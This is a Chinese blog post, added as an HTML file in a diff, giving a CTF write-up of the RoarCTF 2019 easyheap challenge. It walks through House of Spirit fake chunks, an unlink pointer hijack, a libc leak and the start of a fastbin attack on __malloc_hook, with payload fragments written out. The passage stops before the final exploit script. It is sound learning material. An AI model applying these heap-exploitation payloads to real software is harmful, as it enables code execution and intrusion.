@@ -1,0 +1,720 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  data-theme-mode="auto">
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://aixiadaogudexibao.github.io';window.REIMU_CONFIG.relative = '/';window.REIMU_CONFIG.dark_mode = {"button":true,"mode":"auto"};</script>
+  <title>
+    RoarCTF 2019 easyheap | 爱瞎捣鼓的xibao
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="免责声明与说明 免责声明 本文仅用于 网络安全学习、CTF 题解与漏洞原理研究，所有操作均在作者自建的本地&#x2F;虚拟环境中完成。禁止将文中方法、脚本用于未授权系统、生产网络或任何违法用途。若因滥用本文内容造成损失或法律后果，作者与转载平台 不承担任何责任；读者应自行遵守所在地法律法规。   关于 AI 辅助 本文主体为作者实操复现与笔记整理；其中 部分文字润色与结构归纳由 AI 生成&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RoarCTF 2019 easyheap">
+<meta property="og:url" content="https://aixiadaogudexibao.github.io/2026/10/13/RoarCTF2019_easyheap/index.html">
+<meta property="og:site_name" content="爱瞎捣鼓的xibao">
+<meta property="og:description" content="免责声明与说明 免责声明 本文仅用于 网络安全学习、CTF 题解与漏洞原理研究，所有操作均在作者自建的本地&#x2F;虚拟环境中完成。禁止将文中方法、脚本用于未授权系统、生产网络或任何违法用途。若因滥用本文内容造成损失或法律后果，作者与转载平台 不承担任何责任；读者应自行遵守所在地法律法规。   关于 AI 辅助 本文主体为作者实操复现与笔记整理；其中 部分文字润色与结构归纳由 AI 生成&amp;#x2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013122712.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013122733.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013123105.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013122815.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013122840.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013122853.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013123026.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013123509.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013123538.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013122504.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013133143.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013135357.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013134009.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013152618.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013134634.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013152429.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013152217.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013153025.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013153259.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013153659.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013154107.png">
+<meta property="og:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013154707.png">
+<meta property="article:published_time" content="2026-10-13T11:40:05.000Z">
+<meta property="article:modified_time" content="2026-10-13T11:40:05.988Z">
+<meta property="article:author" content="爱瞎捣鼓的xibao">
+<meta property="article:tag" content="House of Spirit">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="glibc-2.23">
+<meta property="article:tag" content="unlink">
+<meta property="article:tag" content="堆溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://aixiadaogudexibao.github.io/images/RoarCTF2019_easyheap/Pasted-image-20261013122712.png">
+    <link rel="alternate" href="/atom.xml" title="爱瞎捣鼓的xibao" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.3/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+    <style id="site-bg-custom">
+  /*
+    Single full-site background only.
+    Reimu also puts the same banner image in #header > img (height 180% + mask).
+    Scrolling that header img over a fixed body bg causes ghost/overlap.
+    Fix: hide header banner img; keep one fixed body layer.
+  */
+  html {
+    background-color: #070b16;
+  }
+  body {
+    background-color: #070b16 !important;
+    background-image: url("/images/site-bg.webp") !important;
+    background-size: cover !important;
+    background-position: center center !important;
+    background-repeat: no-repeat !important;
+    background-attachment: fixed !important;
+  }
+  :root {
+    --color-background: transparent !important;
+    --color-default: #475569 !important;          /* slate-600 grey text */
+    --color-wrap: rgba(248, 250, 252, 0.92) !important; /* grey-white cards */
+    --color-header-background: rgba(248, 250, 252, 0.88) !important;
+    --color-footer-background: rgba(241, 245, 249, 0.92) !important;
+    --color-mobile-nav-background: #f8fafc !important;
+    --color-code-background: #f1f5f9 !important;
+    --color-h2-border: #e2e8f0 !important;
+    --color-hover-shadow: rgba(14, 165, 233, 0.12) !important;
+    --grey-9: #64748b !important;
+  }
+  [data-theme="dark"] {
+    --color-background: transparent !important;
+    --color-default: #cbd5e1 !important;          /* slate-300 */
+    --color-wrap: rgba(30, 41, 59, 0.88) !important; /* slate-800 glass */
+    --color-header-background: rgba(15, 23, 42, 0.9) !important;
+    --color-footer-background: rgba(15, 23, 42, 0.92) !important;
+    --color-mobile-nav-background: #0f172a !important;
+    --color-code-background: rgba(148, 163, 184, 0.12) !important;
+    --color-h2-border: #334155 !important;
+    --color-hover-shadow: rgba(56, 189, 248, 0.18) !important;
+    --grey-9: #94a3b8 !important;
+  }
+  /* kill duplicate banner layer */
+  #header > img,
+  #header > picture,
+  #header > picture img {
+    display: none !important;
+    visibility: hidden !important;
+    opacity: 0 !important;
+    pointer-events: none !important;
+  }
+  /* keep header height; soft top gradient so site title stays readable */
+  #header {
+    background: linear-gradient(
+      to bottom,
+      rgba(7, 11, 22, 0.15) 0%,
+      rgba(7, 11, 22, 0.05) 40%,
+      rgba(7, 11, 22, 0.35) 100%
+    ) !important;
+    isolation: isolate;
+  }
+  @media (max-width: 768px) {
+    body {
+      background-attachment: scroll !important;
+    }
+  }
+  /* Alice pixel cursors with hotspots (48px art) */
+  :root {
+    --cursor-default: url("/images/cursor/alice-cursor-default.png") 2 2, auto !important;
+    --cursor-pointer: url("/images/cursor/alice-cursor-pointer.png") 6 2, pointer !important;
+    --cursor-text: url("/images/cursor/alice-cursor-text.png") 4 12, text !important;
+  }
+</style>
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+    <picture></picture>
+    <img  fetchpriority="high" src="/images/RoarCTF2019_easyheap/Pasted-image-20261013122712.png" alt="RoarCTF 2019 easyheap">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">RoarCTF 2019 easyheap</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E%E4%B8%8E%E8%AF%B4%E6%98%8E"><span class="toc-number">1.</span> <span class="toc-text">免责声明与说明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RoarCTF-2019-easyheap"><span class="toc-number">2.</span> <span class="toc-text">RoarCTF 2019 easyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E9%9D%A2%E8%A7%82%E5%AF%9F%EF%BC%88%E6%9C%AC%E9%A2%98%E6%80%9D%E8%B7%AF%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">题面观察（本题思路）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-username-info-%E5%81%87%E5%9D%97%EF%BC%88House-of-Spirit%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">1. username &#x2F; info 假块（House of Spirit）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%95%B4%E7%90%86%E5%A0%86-%E8%B6%85%E9%95%BF-scanf-%E8%A7%A6%E5%8F%91-consolidate"><span class="toc-number">2.3.</span> <span class="toc-text">2. 整理堆 + 超长 scanf 触发 consolidate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-unlink-%E5%8A%AB%E6%8C%81-gift-%E6%8C%87%E9%92%88"><span class="toc-number">2.4.</span> <span class="toc-text">3. unlink 劫持 gift 指针</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%86%99%E4%B8%BB%E6%8C%87%E9%92%88-magic%EF%BC%8Cleak-libc"><span class="toc-number">2.5.</span> <span class="toc-text">4. 写主指针 + magic，leak libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-fastbin-%E6%89%93%E5%88%B0-malloc-hook-0x23"><span class="toc-number">2.6.</span> <span class="toc-text">5. fastbin 打到 __malloc_hook-0x23</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E8%84%9A%E6%9C%AC%EF%BC%88exp-py%EF%BC%89"><span class="toc-number">2.7.</span> <span class="toc-text">完整脚本（exp.py）</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="爱瞎捣鼓的xibao" class="lazyload">
+  <div class="sidebar-author-name">爱瞎捣鼓的xibao</div>
+  <div class="sidebar-description">笔记与漏洞复现</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">8</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-RoarCTF2019_easyheap" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-10-13T11:40:05.000Z" itemprop="datePublished">2026-10-13</time>
+    <time style="display: none;" id="post-update-time">2026-10-13</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h2 id="免责声明与说明"><a href="#免责声明与说明" class="headerlink" title="免责声明与说明"></a>免责声明与说明</h2><blockquote>
+<p><strong>免责声明</strong></p>
+<p>本文仅用于 <strong>网络安全学习、CTF 题解与漏洞原理研究</strong>，所有操作均在作者自建的本地&#x2F;虚拟环境中完成。<br><strong>禁止</strong>将文中方法、脚本用于未授权系统、生产网络或任何违法用途。<br>若因滥用本文内容造成损失或法律后果，作者与转载平台 <strong>不承担任何责任</strong>；读者应自行遵守所在地法律法规。</p>
+</blockquote>
+<blockquote>
+<p><strong>关于 AI 辅助</strong></p>
+<p>本文主体为作者实操复现与笔记整理；其中 <strong>部分文字润色与结构归纳由 AI 生成&#x2F;协助完成</strong>，并经作者核对后收录。<br>代码、命令与截图请以可复现环境中的实际结果为准；如有错漏，欢迎指正。</p>
+</blockquote>
+<hr>
+<h1 id="RoarCTF-2019-easyheap"><a href="#RoarCTF-2019-easyheap" class="headerlink" title="RoarCTF 2019 easyheap"></a>RoarCTF 2019 easyheap</h1><p>环境：Ubuntu 16.04 &#x2F; libc-2.23（main_arena+88 &#x3D; 0x3c4b78）<br>样本：<code>pwn_patched</code> + 对应 libc<br>保护：Full RELRO &#x2F; Canary &#x2F; NX &#x2F; <strong>No PIE</strong></p>
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013122712.png" alt="Pasted image 20261013122712" width="446" />
+
+<p>菜单：1 add  2 delete  3 show  666 gift</p>
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013122733.png" alt="Pasted image 20261013122733" width="253" />
+
+<p><img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013123105.png" alt="Pasted image 20261013123105"></p>
+<p>要点：</p>
+<ul>
+<li>uaf  漏洞</li>
+</ul>
+<p>add&#x2F;delete <strong>单指针buf</strong> <code>0x602088</code>，free <strong>不清零</strong></p>
+<p><img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013122815.png" alt="Pasted image 20261013122815"></p>
+<ul>
+<li>show 要 magic <code>0x602090 == 0xdeadbeefdeadbeef</code>，show 完 <strong>close(1)&#x2F;close(2)</strong> → 之后只能盲发</li>
+</ul>
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013122840.png" alt="Pasted image 20261013122840" width="376" />
+
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013122853.png" alt="Pasted image 20261013122853" width="234" />
+
+<ul>
+<li>add函数：</li>
+</ul>
+<p>add size ≤ 0x80，次数 <code>0x602018</code> 初值 16<br>并且，malloc地址只使用buf保留，属于单指针题目<br>buf地址：      .bss:0000000000602088 buf</p>
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013123026.png" alt="Pasted image 20261013123026" width="407" />
+
+<ul>
+<li>gift函数</li>
+</ul>
+<p>选项666触发：</p>
+<p><img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013123509.png" alt="Pasted image 20261013123509"></p>
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013123538.png" alt="Pasted image 20261013123538" width="436" />
+
+<p>使用calloc申请一个0xa0的chunk<br>或者删除ptr保留的chunk<br>他也是单指针</p>
+<hr>
+<h2 id="题面观察（本题思路）"><a href="#题面观察（本题思路）" class="headerlink" title="题面观察（本题思路）"></a>题面观察（本题思路）</h2><p>（1）单槽 + 无 edit → 不能常规 multi-chunk 玩；靠 gift 指针 + unlink 改指针</p>
+<p>a.先使用buf指针，在fastbins中堆满不同size的chunk</p>
+<p>b.然后再add一个位于较前位置的chunk,将他重新取回，再delete，用于覆盖buf保留的地址，为合并后前0xa0中，让后续gift申请的chunk能覆盖buf的头</p>
+<p>c.然后scanf一个超长输入，调用malloc的合并，合并一个可以放进unsortedbins的chunk</p>
+<p>d.使用gift,从这个合并后的chunk中分一个0xa0大小的chunk</p>
+<p>d.然后部署unlink的相关配置，并覆盖buf指向的chunk头，用于伪造一个0x90chunk</p>
+<p>e.free(buf)，触发unlink,将ptr指向自身前0x18地址（即0x602080）</p>
+<p>（2）show 被 random magic 锁死 → 先写 magic 再 leak</p>
+<p>a.No PIE → username&#x2F;info 落在固定 <code>.bss</code></p>
+<p><img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013122504.png" alt="Pasted image 20261013122504"></p>
+<p>可使用 House of Spirit<br>修改0x602060和0x6020A0,伪造chunk头.<br>从而free(ptr)，将0x602070-0x6020a0当作chunk放入fastbins</p>
+<p>b.申请0x40的chunk,修改 magic ，去除magic锁，然后泄漏libc地址</p>
+<p>（3）show 后无 stdout → 后半全 <code>sendline</code>&#x2F;<code>send</code>，别 <code>sendlineafter(b&#39;&gt;&gt; &#39;)</code></p>
+<p>关键地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x602088  主 chunk 指针</span><br><span class="line">0x602090  magic</span><br><span class="line">0x602098  gift 指针</span><br><span class="line">0x602018  add 剩余次数</span><br><span class="line">0x602010  gift 剩余次数</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="1-username-info-假块（House-of-Spirit）"><a href="#1-username-info-假块（House-of-Spirit）" class="headerlink" title="1. username &#x2F; info 假块（House of Spirit）"></a>1. username &#x2F; info 假块（House of Spirit）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: p64(0)*3 + p64(0x41)     # 0x602078 = 0x41</span><br><span class="line">info:     p64(0)*2 + p64(0x40) + p64(0x41)</span><br></pre></td></tr></table></figure>
+
+<p>（目的是 .bss 上能当块用。）</p>
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013133143.png" alt="Pasted image 20261013133143" width="530" />
+
+<p>0x602070是伪造的chunk头<br>0x6020b0是伪造的第二个chunk头（用于过free检查）</p>
+<hr>
+<h2 id="2-整理堆-超长-scanf-触发-consolidate"><a href="#2-整理堆-超长-scanf-触发-consolidate" class="headerlink" title="2. 整理堆 + 超长 scanf 触发 consolidate"></a>2. 整理堆 + 超长 scanf 触发 consolidate</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(0x68)/delete</span><br><span class="line">add(0x28)/delete</span><br><span class="line">add(0x58)/delete</span><br><span class="line">add(0x48, b&#x27;a&#x27;*0x20+p64(0x90)+p64(0x31))/delete(防止top合并)</span><br><span class="line">add(0x80, p64(0x30)+p64(0x21))</span><br><span class="line">add(0x58)/delete（让buf指向heap_base+0xb0）</span><br></pre></td></tr></table></figure>
+
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013135357.png" alt="Pasted image 20261013135357" width="237" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sendline(b&#x27;1&#x27;*0x400)</span><br></pre></td></tr></table></figure>
+
+<p><code>scanf(&quot;%d&quot;)</code> 数字太长 → 内部 scratch 扩容 malloc → <strong>malloc_consolidate</strong><br>fastbin 被合并进 unsorted，后面 unlink 的 prev_inuse &#x2F; 尺寸才站得住。</p>
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013134009.png" alt="Pasted image 20261013134009" width="321" />
+
+<blockquote>
+<p>不是“对齐输入”，是真改堆。长度要超过栈上 work buffer（2.23 约 1K 量级）。</p>
+</blockquote>
+<hr>
+<h2 id="3-unlink-劫持-gift-指针"><a href="#3-unlink-劫持-gift-指针" class="headerlink" title="3. unlink 劫持 gift 指针"></a>3. unlink 劫持 gift 指针</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(0)+p64(0x91)+p64(0x602098-0x18)+p64(0x602098-0x10)</span><br><span class="line">payload = payload.ljust(0x90,b&#x27;\x00&#x27;)+p64(0x90)+p64(0x90)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calloc_free(1, payload)</span><br></pre></td></tr></table></figure>
+
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013152618.png" alt="Pasted image 20261013152618" width="340" />
+
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013134634.png" alt="Pasted image 20261013134634" width="328" />
+
+<p>如图：0x1431010：unlink的配置部分<br>0x14310b0：为伪造的chunk头的用户部分<br>（buf此时指向它，这样free（buf）时,就会当作0x90大小释放）</p>
+<p>为了让这个0x90的chunk实现unlink<br>0x1431130:为下一个伪造的chunk头<br>0x1431160:为下下个伪造的chunk头</p>
+<p>为什么要伪造这么多chunk头？<br>因为unlink是会检查前后的chunk是否为free状态</p>
+<p>0x1431010和0x14310b0的伪造，是为了让unlink认为当前chunk前一个chunk为free,这样才能触发想起合并，修改ptr指针</p>
+<p>0x1431130的伪造，是为了让free认为当前chunk是使用状态<br>（自身是否为使用状态，需要查看下一个chunk的inuse位）</p>
+<p>0x1431160的伪造，是为了让unlink认为下一个chunk是使用状态<br>（原理同上，0x1431130的下一个chunk就是0x1431160）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete()</span><br></pre></td></tr></table></figure>
+
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013152429.png" alt="Pasted image 20261013152429" width="455" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calloc_free(2, b&#x27;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013152217.png" alt="Pasted image 20261013152217" width="517" />
+
+<p>为什么这次free,进的是0x40的fastbins呢？<br>因为，unlink合并后，ptr&#x3D;ptr-0x18（0x602080）<br>然后我之前步骤1,部署的假块就在那个位置</p>
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013153025.png" alt="Pasted image 20261013153025" width="507" />
+
+<p>所以，这次free,0x602070被当成chunk放入fastbins中了</p>
+<p>unlink 后 <code>0x602098</code> → 指向 <code>0x602080</code> 一带，后续能改主指针&#x2F;magic。</p>
+<hr>
+<h2 id="4-写主指针-magic，leak-libc"><a href="#4-写主指针-magic，leak-libc" class="headerlink" title="4. 写主指针 + magic，leak libc"></a>4. 写主指针 + magic，leak libc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(0x38, p64(0)+p64(0x602080)+p64(0xdeadbeefdeadbeef))</span><br><span class="line">delete()</span><br><span class="line">add(0x80,b&#x27;a&#x27;); delete()</span><br><span class="line">show()</span><br></pre></td></tr></table></figure>
+
+<p>（1）magic 写成 <code>0xdeadbeefdeadbeef</code> → show 放行<br>（2）<code>recv(6)</code> 拿 unsorted 泄漏<br>（3）libc：</p>
+<img src="/images/RoarCTF2019_easyheap/Pasted-image-20261013153259.png" alt="Pasted image 20261013153259" width="468" />
+
+<p>show 之后 <strong>stdout&#x2F;stderr 没了</strong>，后面全盲发。</p>
+<hr>
+<h2 id="5-fastbin-打到-malloc-hook-0x23"><a href="#5-fastbin-打到-malloc-hook-0x23" class="headerlink" title="5. fastbin 打到 __malloc_hook-0x23"></a>5. fastbin 打到 __malloc_hook-0x23</h2><p>one 列表（本机 2.23）：</p>
